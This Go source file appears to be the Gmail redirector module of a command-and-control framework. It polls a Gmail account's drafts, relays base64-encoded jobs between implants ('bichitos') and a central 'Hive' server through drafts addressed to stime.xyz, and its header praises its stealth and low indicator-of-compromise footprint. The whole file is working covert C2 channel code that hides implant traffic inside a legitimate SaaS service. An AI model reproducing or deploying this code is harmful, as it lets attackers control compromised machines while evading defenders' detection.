// +build gmailgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//	 Network Method: Gmail APi is used. Draft mimic bichitos.
//
//   Warnings:       The top notch stealth					 
//					 
//	 Fingenprint:    "None", Implant connect to a SaaS
//
//   IOC Level:      Low
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////

package main

import (

    "encoding/json"
    "time"
    "strings"
    "bytes"
    "encoding/base64"
    "fmt"
    "os"
    "golang.org/x/net/context"
    "golang.org/x/oauth2"
    "golang.org/x/oauth2/google"
    "google.golang.org/api/gmail/v1"


)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type Reds struct {
    Redirectors []string   `json:"redirectors"`
}

type Gmail struct {
    Name string   `json:"name"`    
    Creds string   `json:"creds"`
	Token string   `json:"token"`
}

var gCreds,gToken string

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

/*
Description: GmailGo Module Redirector Handler
Note: SaaS Handlers work differently from normal Network Modules
While network modules, the trigger to start flows are the connection of Implants, SaaS redirectors will be querying target accounts
each a constant amount of time.
Flow:
A. Extract from the JSON Encoded string the parameters needed for this module
    A1. Loop within "SaaS" Redirectors/Accounts and decode,adding these Connected apps data to a Slice
B. Start a blocked Loop to query back the list of Accounts for Implant activity each 500 mS
*/
func bichitoHandler(){

    var error string
	//Decode Module Parameters, create listener socket
    var redirectors []*Gmail
    var reds *Reds
    
    errD := json.Unmarshal([]byte(redconfig.Coms),&reds)
    if errD != nil{
        fmt.Println("Parameters JSON Decoding error:"+errD.Error())
        os.Exit(1)
    }

    for _,red := range reds.Redirectors{
        var redG *Gmail
        errD = json.Unmarshal([]byte(red),&redG)
        if errD != nil{
            fmt.Println("Parameters JSON Decoding error:"+errD.Error())
            os.Exit(1)
        }
        redirectors = append(redirectors,redG)
    }

    //Query each X time gmail for modifications

        //Process with flow on Drafts where "to" is "redirector@stime.xyz"
            //Flow will read jobs inside (ReceiveJobs)
            //Then will write jobs if any (SendJobs), this will change "to" at "bichito@stime.xyz"

    for{

        gCreds = redirectors[0].Creds
        gToken = redirectors[0].Token 

        error = gmailFlow()
        if error != ""{
            if !(error == "No Active Bichitos in this Gmail Account"){
                addLog("Gmail "+redirectors[0].Name+" Conn Error" + error)
            }
            //Put used redirector to the last element in slice [used...] to [next...used]
            usedSave := redirectors[0]
            redirectors = redirectors[1:]
            redirectors = append(redirectors,usedSave)
        }    

        time.Sleep(time.Duration(500) * time.Millisecond)

    }

}

/*
Description: Query Gmail to inspect Implant activity, and retrieve/Send Jobs
Flow:
A. Retrieve an access token from Gmail Auth Servers, using connected app credentials
B. List all the drafts from the account
C. Set noActive to true, this will be useful to detect if an gmail Account becomes inactive and mark it later on
C. Inspect each draft -->
    C1.If the draft has as "to:" "redirector@stime.xyz", retrieve the Body, and send it as a Job to Hive
    C2.Get the Subject from the draft (this is the bichito BID), retrieve possible Jobs from Hive headed to that BID
       and encode them in a draft body with "to:bichito@stime.xyz" and the subject the BID
*/
func gmailFlow() string{

    //Auth
    config, err := google.ConfigFromJSON([]byte(gCreds), gmail.MailGoogleComScope)
    if err != nil {
        return "Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(gToken)).Decode(tok)
    c := config.Client(context.Background(), tok)
       
    srv, err := gmail.New(c)
    if err != nil {
        return "Unable to retrieve Gmail client:"+ err.Error()
    }
    //

    //var messagesIds []string
    //var draftIds []string
    user := "me"
    r, err := srv.Users.Drafts.List(user).Do()
    if err != nil {
        return "Draft List Getting Error: "+err.Error()
    }



    var noActiveBi = true;
    for _, l := range r.Drafts {
        r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
            if err2 != nil {
                fmt.Println(l.Message.Id)
                continue
            }

        if (r2.Payload.Headers[1].Value == "redirector@stime.xyz"){

            noActiveBi = false;
            //Get Body with Jobs JSON data and sent it to Hive Queue
            rawMessage := r2.Payload.Body.Data
            rawMessage = strings.Replace(rawMessage,"-","+",-1)
            rawMessage = strings.Replace(rawMessage,"_","/",-1)

            jsonJob, err := base64.StdEncoding.DecodeString(rawMessage)
            if err != nil {
                    return "B64 MIME Decoding Error: "+err.Error()
            }

            //Decode Job
            decoder := json.NewDecoder(bytes.NewReader(jsonJob))
            var jobs []*Job
            err = decoder.Decode(&jobs)
            if err != nil {
                return "Jobs(Error Decoding Bichito Job)"+err.Error()
            }

            go processJobs(jobs)
            
           // if (len(getBiJobs(r2.Payload.Headers[2].Value)) > 0){
                //Get Json of encoded Jobs for target Bid and update draft
            bufRP := new(bytes.Buffer)
            json.NewEncoder(bufRP).Encode(getBiJobs(r2.Payload.Headers[2].Value))
            resultRP := bufRP.String()

            rawDraft := "To: bichito@stime.xyz\r\nSubject:"+r2.Payload.Headers[2].Value+"\r\n\r\n"+resultRP
            message := &gmail.Message{Raw:base64.RawURLEncoding.EncodeToString([]byte(rawDraft))}
            draft := &gmail.Draft{Message:message}
       
            _, err = srv.Users.Drafts.Update(user,l.Id,draft).Do()
            if err != nil {
                return "Getting Draft Message from Id error: "+err.Error()
            }

        }

    }

  if noActiveBi{
    return "No Active Bichitos in this Gmail Account"
  }  
  return ""

}